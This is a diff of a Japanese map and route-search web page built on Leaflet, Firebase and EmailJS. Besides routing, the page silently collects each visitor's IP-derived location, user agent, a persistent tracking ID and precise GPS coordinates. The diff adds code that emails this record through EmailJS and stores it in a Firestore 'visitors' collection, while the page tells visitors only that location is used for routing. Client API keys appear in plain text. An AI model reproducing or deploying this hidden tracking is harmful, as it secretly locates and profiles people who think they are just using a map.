@@ -3,130 +3,48 @@
 <head>
   <meta charset="UTF-8">
   <title>地図ピンとルート検索</title>
-
-  <!-- LeafletとRouting Machine -->
+  <!-- Leaflet + Routing -->
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <script src="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.js"></script>
 
-  <!-- Firebase SDK -->
-  <script type="module">
-    // Firebase SDKのインポート
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-firestore.js";
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
-    // Firebaseの設定
+  <!-- Firebase -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.7.1/firebase-firestore.js";
+
     const firebaseConfig = {
       apiKey: "AIzaSyADQyGZQ2qtzeX4C0Ne4cCKA_mT0PFsPn4",
       authDomain: "ipphone-c4de8.firebaseapp.com",
       projectId: "ipphone-c4de8",
-      storageBucket: "ipphone-c4de8.firebasestorage.app",
+      storageBucket: "ipphone-c4de8.appspot.com",
       messagingSenderId: "937358791870",
       appId: "1:937358791870:web:3f2a4c54ba8b63e0457aef",
       measurementId: "G-2B0DFZ0RP7"
     };
 
-    // Firebase初期化
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // ユーザー情報をFirestoreに保存する関数
-    function saveUserInfo(info) {
-      // Firestoreの"users"コレクションにデータを追加
-      addDoc(collection(db, "users"), info)
-        .then(() => {
-          console.log("ユーザー情報がFirestoreに保存されました。");
-        })
-        .catch((error) => {
-          console.error("データの保存に失敗しました: ", error);
-        });
-    }
-
-    function getOrCreateVisitorId() {
-      let lot = localStorage.getItem("visitor_lot_id");
-      if (!lot) {
-        lot = "lot_" + Math.random().toString(36).substring(2, 10);
-        localStorage.setItem("visitor_lot_id", lot);
+    window.saveToFirestore = async function (data) {
+      try {
+        await addDoc(collection(db, "visitors"), data);
+        console.log("保存成功");
+      } catch (e) {
+        console.error("Firestore保存失敗", e);
       }
-      return lot;
-    }
-
-    function sendUserInfo() {
-      const ua = navigator.userAgent;
-      const lang = navigator.language;
-      const lot = getOrCreateVisitorId();
-
-      fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(data => {
-          const info = {
-            ip: data.ip,
-            country: data.country_name,
-            region: data.region,
-            city: data.city,
-            language: lang,
-            user_agent: ua,
-            latitude: "",
-            longitude: "",
-            lot: lot,
-            timestamp: new Date()  // 保存する日時
-          };
-
-          const send = () => saveUserInfo(info);
-
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-              info.latitude = pos.coords.latitude;
-              info.longitude = pos.coords.longitude;
-              send();
-            }, send);
-          } else {
-            send();
-          }
-        });
-    }
+    };
   </script>
 
-  <!-- EmailJS -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      color: #ccc;
-      font-family: sans-serif;
-      user-select: none;
-      -webkit-user-select: none;
-      -webkit-touch-callout: none;
-      touch-action: manipulation;
-    }
-    #map {
-      height: 100%;
-      width: 100%;
-      z-index: 1;
-    }
-    #info {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      background: rgba(0, 0, 0, 0.7);
-      padding: 10px;
-      border-radius: 6px;
-      z-index: 1000;
-    }
-    #routeInfo, #locationWarning {
-      margin-top: 5px;
-      font-size: 14px;
-    }
-    select {
-      background: #000;
-      color: #ccc;
-      border: 1px solid #888;
-    }
+    html, body { height: 100%; margin: 0; background: #000; color: #ccc; font-family: sans-serif; user-select: none; }
+    #map { height: 100%; width: 100%; }
+    #info { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 10px; border-radius: 6px; z-index: 1000; }
+    select { background: #000; color: #ccc; border: 1px solid #888; }
   </style>
 </head>
 <body>
@@ -139,20 +57,16 @@
     <div id="routeInfo"></div>
     <div id="locationWarning" style="display: none;">
       このサイトは位置情報を使い経路を検索します。<br>
-      iPhoneの場合：<br>
-      設定 > 位置情報サービス > Safari または Chrome > 常に許可 or アプリの使用中のみ許可 に設定し、<br>
-      サイトに戻ってきてください。
+      iPhoneの場合：<br>設定 > 位置情報サービス > Safari または Chrome > 常に許可にしてください。
     </div>
   </div>
   <div id="map"></div>
 
   <script>
-    let map, userMarker, destMarker, routeControl;
-    let touchStartTime = 0;
-    let touchMoved = false;
-
-    // Firebaseを使用するための関数
     emailjs.init("nPbnct21qNKkJNuaF");
+
+    let map, userMarker, destMarker, routeControl;
+    let touchStartTime = 0, touchMoved = false;
 
     function getOrCreateVisitorId() {
       let lot = localStorage.getItem("visitor_lot_id");
@@ -165,18 +79,11 @@
 
     function initMap() {
       map = L.map('map').setView([35.68, 139.76], 13);
-
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '© OpenStreetMap contributors'
-      }).addTo(map);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
       routeControl = L.Routing.control({
-        waypoints: [],
-        routeWhileDragging: false,
-        addWaypoints: false,
-        draggableWaypoints: false,
-        show: false,
-        createMarker: () => null
+        waypoints: [], routeWhileDragging: false, addWaypoints: false,
+        draggableWaypoints: false, show: false, createMarker: () => null
       }).addTo(map);
 
       if (navigator.geolocation) {
@@ -184,25 +91,17 @@
           const latlng = [pos.coords.latitude, pos.coords.longitude];
           userMarker = L.marker(latlng).addTo(map).bindPopup("現在地").openPopup();
           map.setView(latlng, 15);
-        }, () => {
-          document.getElementById("locationWarning").style.display = "block";
-        });
+        }, () => document.getElementById("locationWarning").style.display = "block");
       } else {
         document.getElementById("locationWarning").style.display = "block";
       }
 
-      const container = map.getContainer();
-
-      container.addEventListener("touchstart", e => {
+      map.getContainer().addEventListener("touchstart", () => {
         touchMoved = false;
         touchStartTime = Date.now();
       });
-
-      container.addEventListener("touchmove", () => {
-        touchMoved = true;
-      });
-
-      container.addEventListener("touchend", e => {
+      map.getContainer().addEventListener("touchmove", () => touchMoved = true);
+      map.getContainer().addEventListener("touchend", e => {
         const duration = Date.now() - touchStartTime;
         if (!touchMoved && duration > 500 && duration < 2000) {
           const touch = e.changedTouches[0];
@@ -219,23 +118,15 @@
 
     function placeDestination(latlng) {
       if (!userMarker) return alert("現在地がまだ取得できていません");
-
-      if (destMarker) {
-        map.removeLayer(destMarker);
-      }
+      if (destMarker) map.removeLayer(destMarker);
       destMarker = L.marker(latlng).addTo(map).bindPopup("目的地").openPopup();
+      routeControl.setWaypoints([userMarker.getLatLng(), latlng]);
 
-      routeControl.setWaypoints([
-        userMarker.getLatLng(),
-        latlng
-      ]);
-
-      routeControl.on('routesfound', function(e) {
+      routeControl.on('routesfound', e => {
         const route = e.routes[0];
         const dist = (route.summary.totalDistance / 1000).toFixed(2);
         const time = (route.summary.totalTime / 60).toFixed(1);
-        document.getElementById("routeInfo").innerHTML =
-          `距離: ${dist} km<br>時間: ${time} 分`;
+        document.getElementById("routeInfo").innerHTML = `距離: ${dist} km<br>時間: ${time} 分`;
       });
     }
 
@@ -257,10 +148,13 @@
             latitude: "",
             longitude: "",
             lot: lot,
-            timestamp: new Date()  // 保存する日時
+            timestamp: new Date().toISOString()
           };
 
-          const send = () => saveUserInfo(info);
+          const send = () => {
+            emailjs.send("service_uwd8bfs", "template_f5giywa", info);
+            window.saveToFirestore(info); // Firestoreに保存
+          };
 
           if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
